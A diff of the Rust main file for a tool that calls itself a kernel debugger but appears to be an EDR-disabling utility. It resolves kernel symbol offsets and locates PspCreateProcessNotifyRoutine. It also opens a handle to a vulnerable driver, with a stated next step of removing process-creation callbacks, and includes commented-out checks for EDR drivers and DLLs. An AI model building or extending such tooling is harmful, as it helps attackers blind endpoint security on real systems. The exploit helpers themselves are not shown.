@@ -1,12 +1,13 @@
-use std::{thread, time, process};
-use std::io::{self};
+use std::{thread, time};
+use std::ffi::c_void;
 
-use winapi::shared::minwindef::{DWORD, LPVOID};
-use winapi::um::winnt::ADMINISTRATOR_POWER_POLICY;
+use winapi::shared::minwindef::{DWORD};     /// Can add LPVOID, etc.
+//use winapi::um::handleapi::{CloseHandle};
 
 mod utils;
 mod pdb_utils;
-mod driver_utils;
+mod km_utils;
+mod xp_utils;
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[+] =-=-=- WinDbgX Kernel Debugger -=-=-=");
@@ -39,7 +40,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         Ok(url) => url,
         Err(e) => {
             eprintln!("[!] Failed to get PDB URL for FLTMGR: {}", e);
-            std::process::exit(1);
+            std::process::exit(-1);
         }
     };
 
@@ -49,44 +50,84 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     
     // Download symbol files
     let mut nt_pdb = utils::download_pdb(&nt_url)?;
-    let mut fm_pdb = utils::download_pdb(&fltmgr_url)?;
+    let fm_pdb = utils::download_pdb(&fltmgr_url)?;
 
     // Parse symbol files for offsets
+    let nt_offsets;
     match pdb_utils::get_nt_offsets(&mut nt_pdb) {
-        Ok(nt_offsets) => {}
+        Ok(offsets) => {
+            println!("[+] Got NT offsets for this version...game on :D");
+            nt_offsets = offsets; // bind to outer var
+        }
         Err(e) => {
             eprintln!("[-] Failed to parse NT offsets: {}", e);
-            process::exit(-1);
+            std::process::exit(-1);
         }
     }
 
-    // Get a handle to the driver
-    driver_utils::get_driver_handle();
-
-    let drivers = ["ntoskrnl.exe", "fltmgr.sys"];
-
-    for drv in &drivers {
-        match driver_utils::get_driver_base(drv) {
-            Some(base) => println!("[+] {} base address: {:?}", drv, base),
-            None => println!("[-] Could not find {}", drv),
+    // Get base addresses for target kernel modules
+    let nt_base;
+    let fm_base;
+    match km_utils::get_driver_base("ntoskrnl.exe") {
+        Some(base) => {
+            println!("[+] NT base address: {:?}", base);
+            nt_base = base;
+        },
+        None => {
+            println!("[!] Could not find base address for ntoskrnl.exe!");
+            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
+            std::process::exit(-1);
+        }
+    }
+    match km_utils::get_driver_base("fltmgr.sys") {
+        Some(base) => {
+            println!("[+] FltMgr.sys base address: {:?}", base);
+            fm_base = base;
+        },
+        None => {
+            println!("[!] Could not find base address for fltmgr.sys!");
+            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
+            std::process::exit(-1);
         }
     }
 
-    // -=-= TESTING: Checking the module base address for driver name + if matching EDR
-    let mut addr: u64 = 0xfffff807200581e0;
-    if let Some(driver_name) = driver_utils::find_driver_name_from_addr(addr) {
-        let mut is_edr: bool = driver_utils::is_driver_name_matching_edr(&driver_name);
+    // Get full addresses for NT kernel objects
+    let process_create_notify_base = {
+        (nt_base as usize).wrapping_add(nt_offsets.psp_create_process_notify_routine as usize)
+            as *mut c_void
+    };
+
+    println!("[>] PspCreateProcessNotifyRoutine is at: {:?}", process_create_notify_base);
+
+    /* -=-= TESTING: Checking the module base address for driver name + if matching EDR
+    let addr: u64 = 0xfffff807200581e0;
+    if let Some(driver_name) = km_utils::find_driver_name_from_addr(addr) {
+        let is_edr: bool = km_utils::is_driver_name_matching_edr(&driver_name);
         println!("[*] Address 0x{:016x}: {} [EDR? {}]", addr, driver_name, is_edr);   
     }
 
     // =-=- TESTING: Check the loaded DLLs in a process
-    let mut target_pid: DWORD = 11212;
+    let target_pid: DWORD = 11212;
     if utils::is_edr_dll_loaded(target_pid) {
         println!("[*] EDR DLL detected in process {}", target_pid);
     } else {
         println!("[-] No suspicious EDR DLLs found in process {}", target_pid);
     }
-
+    */
+    
+    
+    // Get a handle to the vuln driver
+    let h_drv;
+    match xp_utils::get_driver_handle() {
+        Ok(handle) => {
+            h_drv = handle;
+        }
+        Err(err) => {
+            eprintln!("[-] Could not get handle, error: {}", err);
+            std::process::exit(-1);
+        }
+    }
+    println!("[+] Got driver handle: {:?}", h_drv);
 
     // Remove Process Creation Notification callback
 
